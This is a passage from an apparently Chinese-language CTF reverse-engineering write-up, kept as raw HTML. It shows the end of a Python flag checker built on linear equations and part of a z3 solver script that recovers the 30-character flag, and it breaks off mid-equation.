class="hljs-number">25</span> * enc[<span class="hljs-number">25</span>] - <span class="hljs-number">26</span> * enc[<span class="hljs-number">26</span>] + <span class="hljs-number">27</span> * enc[<span class="hljs-number">27</span>] - <span class="hljs-number">28</span> * enc[<span class="hljs-number">28</span>] == <span class="hljs-number">185016</span>,<br>         <span class="hljs-number">77</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">2</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">96</span> * enc[<span class="hljs-number">4</span>] - <span class="hljs-number">9</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">6</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">96</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">0</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">20</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">99</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">11</span>] + <span class="hljs-number">10</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">707</span> * enc[<span class="hljs-number">13</span>] + <span class="hljs-number">250</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">666</span> * enc[<span class="hljs-number">15</span>] + -<span class="hljs-number">9</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">17</span>] + -<span class="hljs-number">2</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">9</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">21</span> * enc[<span class="hljs-number">21</span>] + <span class="hljs-number">222</span> * enc[<span class="hljs-number">22</span>] + <span class="hljs-number">23</span> * enc[<span class="hljs-number">23</span>] - <span class="hljs-number">224</span> * enc[<span class="hljs-number">24</span>] + <span class="hljs-number">26</span> * enc[<span class="hljs-number">25</span>] - -<span class="hljs-number">58</span> * enc[<span class="hljs-number">26</span>] + <span class="hljs-number">27</span> * enc[<span class="hljs-number">27</span>] - <span class="hljs-number">2</span> * enc[<span class="hljs-number">28</span>] + <span class="hljs-number">29</span> * enc[<span class="hljs-number">29</span>] == <span class="hljs-number">130106</span>]<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(n):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Congratulation!!!&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;wrong_wrong!!!&quot;</span>)<br></code></pre></td></tr></table></figure><p>一眼 z3, <code>111111116257645365477364777645752361</code>即密文，每个数字代表一个字符出现的次数<br>z3 求解</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 定义 30 个变量，对应 flag 的每个字符的 ASCII 值</span><br>enc = [Int(<span class="hljs-string">f&#x27;enc<span class="hljs-subst">&#123;j&#125;</span>&#x27;</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>)]<br><br>s = Solver()<br><br><span class="hljs-comment"># 限制所有变量在 ASCII 范围内（通常 flag 用可打印字符）</span><br><span class="hljs-keyword">for</span> var <span class="hljs-keyword">in</span> enc:<br>    s.add(var &gt;= <span class="hljs-number">32</span>, var &lt;= <span class="hljs-number">126</span>)<br><br><br>s.add(<span class="hljs-number">7</span> * enc[<span class="hljs-number">0</span>] == <span class="hljs-number">504</span>)<br>s.add(<span class="hljs-number">9</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">5</span> * enc[<span class="hljs-number">1</span>] == <span class="hljs-number">403</span>)<br>s.add(<span class="hljs-number">2</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">5</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">10</span> * enc[<span class="hljs-number">2</span>] == <span class="hljs-number">799</span>)<br>s.add(<span class="hljs-number">3</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">8</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">15</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">20</span> * enc[<span class="hljs-number">3</span>] == <span class="hljs-number">2938</span>)<br>s.add(<span class="hljs-number">5</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">15</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">20</span> * enc[<span class="hljs-number">2</span>] - <span class="hljs-number">19</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">4</span>] == <span class="hljs-number">2042</span>)<br>s.add(<span class="hljs-number">7</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">9</span> * enc[<span class="hljs-number">2</span>] - <span class="hljs-number">11</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">2</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">5</span> * enc[<span class="hljs-number">5</span>] == <span class="hljs-number">1225</span>)<br>s.add(<span class="hljs-number">11</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">22</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">33</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">44</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">55</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">77</span> * enc[<span class="hljs-number">6</span>] == <span class="hljs-number">7975</span>)<br>s.add(<span class="hljs-number">21</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">23</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">24</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">55</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">7</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">15</span> * enc[<span class="hljs-number">7</span>] == <span class="hljs-number">229</span>)<br>s.add(<span class="hljs-number">2</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">26</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">13</span> * enc[<span class="hljs-number">2</span>] - <span class="hljs-number">65</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">15</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">29</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">7</span>] + <span class="hljs-number">20</span> * enc[<span class="hljs-number">8</span>] == <span class="hljs-number">2107</span>)<br>s.add(<span class="hljs-number">10</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">7</span> * enc[<span class="hljs-number">1</span>] - <span class="hljs-number">9</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">7</span> * enc[<span class="hljs-number">4</span>] + enc[<span class="hljs-number">5</span>] + <span class="hljs-number">22</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">21</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">22</span> * enc[<span class="hljs-number">8</span>] + <span class="hljs-number">30</span> * enc[<span class="hljs-number">9</span>] == <span class="hljs-number">4037</span>)<br>s.add(<span class="hljs-number">15</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">59</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">56</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">7</span> * enc[<span class="hljs-number">4</span>] + enc[<span class="hljs-number">5</span>] - <span class="hljs-number">122</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">21</span> * enc[<span class="hljs-number">7</span>] + <span class="hljs-number">32</span> * enc[<span class="hljs-number">8</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">9</span>] - <span class="hljs-number">10</span> * enc[<span class="hljs-number">10</span>] == <span class="hljs-number">4950</span>)<br>s.add(<span class="hljs-number">13</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">29</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">39</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">33</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">13</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">2</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">42</span> * enc[<span class="hljs-number">7</span>] + <span class="hljs-number">62</span> * enc[<span class="hljs-number">8</span>] + enc[<span class="hljs-number">9</span>] - <span class="hljs-number">10</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">11</span> * enc[<span class="hljs-number">11</span>] == <span class="hljs-number">12544</span>)<br>s.add(<span class="hljs-number">23</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">29</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">3</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">63</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">25</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">2</span> * enc[<span class="hljs-number">7</span>] + <span class="hljs-number">32</span> * enc[<span class="hljs-number">8</span>] + enc[<span class="hljs-number">9</span>] - <span class="hljs-number">10</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">11</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">12</span> * enc[<span class="hljs-number">12</span>] == <span class="hljs-number">6585</span>)<br>s.add(<span class="hljs-number">223</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">1</span>] - <span class="hljs-number">29</span> * enc[<span class="hljs-number">2</span>] - <span class="hljs-number">53</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">3</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">65</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">36</span> * enc[<span class="hljs-number">8</span>] + enc[<span class="hljs-number">9</span>] - <span class="hljs-number">15</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">16</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">18</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">13</span> * enc[<span class="hljs-number">13</span>] == <span class="hljs-number">6893</span>)<br>s.add(<span class="hljs-number">29</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">13</span> * enc[<span class="hljs-number">1</span>] - <span class="hljs-number">9</span> * enc[<span class="hljs-number">2</span>] - <span class="hljs-number">93</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">33</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">65</span> * enc[<span class="hljs-number">6</span>] + enc[<span class="hljs-number">7</span>] - <span class="hljs-number">36</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">16</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">96</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">68</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">33</span> * enc[<span class="hljs-number">13</span>] - <span class="hljs-number">14</span> * enc[<span class="hljs-number">14</span>] == <span class="hljs-number">1883</span>)<br>s.add(<span class="hljs-number">69</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">77</span> * enc[<span class="hljs-number">1</span>] - <span class="hljs-number">93</span> * enc[<span class="hljs-number">2</span>] - <span class="hljs-number">12</span> * enc[<span class="hljs-number">3</span>] + enc[<span class="hljs-number">6</span>] + <span class="hljs-number">16</span> * enc[<span class="hljs-number">7</span>] + <span class="hljs-number">36</span> * enc[<span class="hljs-number">8</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">19</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">8</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">38</span> * enc[<span class="hljs-number">13</span>] - <span class="hljs-number">16</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">15</span> * enc[<span class="hljs-number">15</span>] == <span class="hljs-number">8257</span>)<br>s.add(<span class="hljs-number">23</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">2</span> * enc[<span class="hljs-number">1</span>] - <span class="hljs-number">3</span> * enc[<span class="hljs-number">2</span>] - <span class="hljs-number">11</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">12</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">24</span> * enc[<span class="hljs-number">5</span>] + enc[<span class="hljs-number">6</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">7</span>] + <span class="hljs-number">14</span> * enc[<span class="hljs-number">8</span>] + enc[<span class="hljs-number">10</span>] + <span class="hljs-number">68</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">18</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">68</span> * enc[<span class="hljs-number">13</span>] - <span class="hljs-number">26</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">15</span> * enc[<span class="hljs-number">15</span>] - <span class="hljs-number">16</span> * enc[<span class="hljs-number">16</span>] == <span class="hljs-number">5847</span>)<br>s.add(<span class="hljs-number">24</span> * enc[<span class="hljs-number">0</span>] - enc[<span class="hljs-number">2</span>] - <span class="hljs-number">15</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">13</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">4</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">16</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">67</span> * enc[<span class="hljs-number">7</span>] + <span class="hljs-number">146</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">50</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">16</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">11</span>] - enc[<span class="hljs-number">12</span>] + <span class="hljs-number">69</span> * enc[<span class="hljs-number">13</span>] - <span class="hljs-number">27</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">45</span> * enc[<span class="hljs-number">15</span>] - <span class="hljs-number">6</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">17</span> * enc[<span class="hljs-number">17</span>] == <span class="hljs-number">18257</span>)<br>s.add(<span class="hljs-number">25</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">26</span> * enc[<span class="hljs-number">1</span>] - <span class="hljs-number">89</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">16</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">19</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">44</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">36</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">150</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">250</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">166</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">126</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">11</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">690</span> * enc[<span class="hljs-number">13</span>] - <span class="hljs-number">207</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">46</span> * enc[<span class="hljs-number">15</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">7</span> * enc[<span class="hljs-number">17</span>] - <span class="hljs-number">18</span> * enc[<span class="hljs-number">18</span>] == <span class="hljs-number">12591</span>)<br>s.add(<span class="hljs-number">5</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">26</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">8</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">160</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">9</span> * enc[<span class="hljs-number">4</span>] - <span class="hljs-number">4</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">36</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">15</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">20</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">16</span> * enc[<span class="hljs-number">11</span>] - enc[<span class="hljs-number">12</span>] + <span class="hljs-number">690</span> * enc[<span class="hljs-number">13</span>] - <span class="hljs-number">20</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">46</span> * enc[<span class="hljs-number">15</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">7</span> * enc[<span class="hljs-number">17</span>] - <span class="hljs-number">18</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">19</span> * enc[<span class="hljs-number">19</span>] == <span class="hljs-number">52041</span>)<br>s.add(<span class="hljs-number">29</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">26</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">60</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">90</span> * enc[<span class="hljs-number">4</span>] - <span class="hljs-number">4</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">16</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">21</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">69</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">12</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">69</span> * enc[<span class="hljs-number">13</span>] - <span class="hljs-number">20</span> * enc[<span class="hljs-number">14</span>] - <span class="hljs-number">46</span> * enc[<span class="hljs-number">15</span>] + <span class="hljs-number">65</span> * enc[<span class="hljs-number">16</span>] - enc[<span class="hljs-number">18</span>] + <span class="hljs-number">39</span> * enc[<span class="hljs-number">19</span>] - <span class="hljs-number">20</span> * enc[<span class="hljs-number">20</span>] == <span class="hljs-number">20253</span>)<br>s.add(<span class="hljs-number">45</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">56</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">10</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">650</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">900</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">44</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">6</span>] - <span class="hljs-number">6</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">6</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">21</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">9</span> * enc[<span class="hljs-number">10</span>] - <span class="hljs-number">6</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">12</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">69</span> * enc[<span class="hljs-number">13</span>] - <span class="hljs-number">2</span> * enc[<span class="hljs-number">14</span>] - <span class="hljs-number">406</span> * enc[<span class="hljs-number">15</span>] + <span class="hljs-number">651</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">2</span> * enc[<span class="hljs-number">17</span>] - <span class="hljs-number">10</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">69</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">21</span> * enc[<span class="hljs-number">21</span>] == <span class="hljs-number">18768</span>)<br>s.add(<span class="hljs-number">555</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">6666</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">70</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">510</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">90</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">499</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">6</span>] - <span class="hljs-number">66</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">610</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">221</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">9</span> * enc[<span class="hljs-number">10</span>] - <span class="hljs-number">23</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">102</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">13</span>] + <span class="hljs-number">2050</span> * enc[<span class="hljs-number">14</span>] - <span class="hljs-number">406</span> * enc[<span class="hljs-number">15</span>] + <span class="hljs-number">665</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">333</span> * enc[<span class="hljs-number">17</span>] + <span class="hljs-number">100</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">609</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">777</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">201</span> * enc[<span class="hljs-number">21</span>] - <span class="hljs-number">22</span> * enc[<span class="hljs-number">22</span>] == <span class="hljs-number">111844</span>,)<br>s.add(<span class="hljs-number">1</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">22</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">333</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">4444</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">5555</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">6666</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">666</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">676</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">660</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">22</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">9</span> * enc[<span class="hljs-number">10</span>] - <span class="hljs-number">73</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">107</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">13</span>] + <span class="hljs-number">250</span> * enc[<span class="hljs-number">14</span>] - <span class="hljs-number">6</span> * enc[<span class="hljs-number">15</span>] + <span class="hljs-number">65</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">39</span> * enc[<span class="hljs-number">17</span>] + <span class="hljs-number">10</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">69</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">777</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">201</span> * enc[<span class="hljs-number">21</span>] - <span class="hljs-number">2</span> * enc[<span class="hljs-number">22</span>] + <span class="hljs-number">23</span> * enc[<span class="hljs-number">23</span>] == <span class="hljs-number">159029</span>,)<br>s.add(<span class="hljs-number">520</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">222</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">333</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">4</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">56655</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">6666</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">666</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">60</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">220</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">99</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">73</span> * enc[<span class="hljs-number">11</span>] + <span class="hljs-number">1007</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">7777</span> * enc[<span class="hljs-number">13</span>] + <span class="hljs-number">2500</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">6666</span> * enc[<span class="hljs-number">15</span>] + <span class="hljs-number">605</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">390</span> * enc[<span class="hljs-number">17</span>] + <span class="hljs-number">100</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">609</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">99999</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">210</span> * enc[<span class="hljs-number">21</span>] + <span class="hljs-number">232</span> * enc[<span class="hljs-number">22</span>] + <span class="hljs-number">23</span> * enc[<span class="hljs-number">23</span>] - <span class="hljs-number">24</span> * enc[<span class="hljs-number">24</span>] == <span class="hljs-number">2762025</span>,)<br>s.add(<span class="hljs-number">1323</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">22</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">333</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">4</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">55</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">666</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">666</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">660</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">220</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">99</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">11</span>] + <span class="hljs-number">100</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">777</span> * enc[<span class="hljs-number">13</span>] + <span class="hljs-number">2500</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">6666</span> * enc[<span class="hljs-number">15</span>] + <span class="hljs-number">605</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">390</span> * enc[<span class="hljs-number">17</span>] + <span class="hljs-number">100</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">609</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">9999</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">210</span> * enc[<span class="hljs-number">21</span>] + <span class="hljs-number">232</span> * enc[<span class="hljs-number">22</span>] + <span class="hljs-number">23</span> * enc[<span class="hljs-number">23</span>] - <span class="hljs-number">24</span> * enc[<span class="hljs-number">24</span>] + <span class="hljs-number">25</span> * enc[<span class="hljs-number">25</span>] == <span class="hljs-number">1551621</span>,)<br>s.add(<span class="hljs-number">777</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">22</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">6969</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">4</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">55</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">666</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">6</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">96</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">60</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">220</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">99</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">11</span>] + <span class="hljs-number">100</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">777</span> * enc[<span class="hljs-number">13</span>] + <span class="hljs-number">250</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">666</span> * enc[<span class="hljs-number">15</span>] + <span class="hljs-number">65</span> * enc[<span 